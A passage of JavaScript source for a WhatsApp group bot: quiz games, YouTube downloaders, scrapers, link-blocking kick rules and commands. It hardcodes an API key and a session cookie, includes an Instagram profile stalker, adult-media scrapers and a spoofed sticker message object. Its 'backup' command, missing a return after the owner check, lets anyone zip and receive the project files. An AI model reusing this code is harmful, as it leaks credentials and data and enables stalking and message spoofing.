                await reply('*Anda Telah menyerah*')
                delete tebakkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakkalimat[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaklirik[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaktebakan[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        
function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Kyuu.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Kyuu.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Kyuu.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Kyuu.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
Kyuu.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return Kyuu.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

/*async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}*/

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`This feature is specifically for premium user, contact the owner to become premium user`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await Kyuu.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await Kyuu.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await Kyuu.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Kyuu.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return Kyuu.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (isOwner) return Kyuu.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        kice = m.sender
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Kyuu.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame  by Fxyz
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
kice = m.sender
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
kice = m.sender
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex  by Fxyz
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Kyuu.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words  by Fxyz
if (antiToxic)
if (BadXeon.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by FallZx
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by FallZx
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by FallZx
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by FallZx
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by FallZx
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by FallZx
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by FallZx
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by FallZx
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isOwner) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
Kyuu.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
Kyuu.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyKyuuList(chath, dblist)) {
var getraindata = getDataKyuuList(chath, dblist)
if (getraindata.isImage === false) {
Kyuu.sendMessage(m.chat, { text: sendKyuuList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getraindata.image_url)
Kyuu.sendImage(m.chat, buff, `${getraindata.response}`, m)
}
}

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: Kyuu.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Kyuu.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Kyuu.ev.emit('messages.upsert', msg)
}
//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
Kyuu.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

switch (command) {
	case 'public': {
                if (!isOwner) return replygcxeon(mess.owner)
                Kyuu.public = true
                replygcxeon('*Successful in Changing To Public Usage*')
            }
            break
            case 'self': {
                if (!isOwner) return replygcxeon(mess.owner)
                Kyuu.public = false
                replygcxeon('*Successful in Changing To Self Usage*')
            }
            break
            case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcxeon(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await Kyuu.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await Kyuu.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      Kyuu.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcxeon('Error')
    }
    }
    break
        case 'daftar':
                if (isRegistered) return replygcxeon('Kamu sudah terdaftar')
                if (!q.includes('|')) return replygcxeon('Format salah!')
                const namaUser = q.substring(0, q.indexOf('|') - 0)
                const umurUser = q.substring(q.lastIndexOf('|') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return replygcxeon('Umur harus berupa angka!!')
                if (namaUser.length >= 30) return replygcxeon(`why is your name so long it's a name or a train`)
                if (umurUser > 100) return replygcxeon(`your age is too  old maximum 100 years`)
                if (umurUser < 10) return replygcxeon(`your age is too young minimum 12 years`)
				mzd = `Kamu telah terdaftar dengan informasi sebagai berikut:\n\n⭔ Nama : ${namaUser}\n⭔ Umur : ${umurUser}\n⭔ Nomor : wa.me/${m.sender.split("@")[0]}\n⭔ NS : ${serialUser}`
               thumb = fs.readFileSync("./thumbnail/regisnya.jpg")
                veri = m.sender
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    Kyuu.sendMessage(m.chat, {image: thumb, caption: mzd}, {quoted: m})
                    
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    Kyuu.sendMessage(m.chat, {image: thumb, caption: mzd}, {quoted: m})
                    
                }
		break   
        case 'paptt':
            if (!isPrem && !isOwner) return replygcxeon(mess.prem)
            if (!q) return replygcxeon(`Example ${prefix + command} foto/video`)
            let papttfoto = JSON.parse(fs.readFileSync('./database/foto.json'))
            let papttvideo = JSON.parse(fs.readFileSync('./database/video.json'))
            let titid1 = (pickRandom(papttfoto))
            let titid2 = (pickRandom(papttvideo))
            if (q == 'foto') {
                replygcxeon("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
                Kyuu.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            } else if (q == 'video') {
                replygcxeon("Video Akan Dikirim Lewat Private Chat ( *PC* )")
                Kyuu.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            }
        break
case "backup":
        {
          if (!isOwner) replygcxeon("Khusus Owner Anj!!!"); 
     await replygcxeon("Sabar Mas Lagi Backup!!!");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "session" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r New.zip ${ls.join(" ")}`);
          await Kyuu.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./New.zip"),
              mimetype: "application/zip",
              fileName: "New.zip",
            },
            { quoted: m }
          );
          await execSync("rm -rf NewV7.zip");
        }
        break
case "createqr": {
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah Harusnya ${prefix+command} Hyuu`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
Kyuu.sendMessage(from, { image: data, caption: `Sukses Kak` }, { quoted: m })
}
break
case "detectqr": {
try {
mee = await Kyuu.downloadAndSaveMediaMessage(quoted)
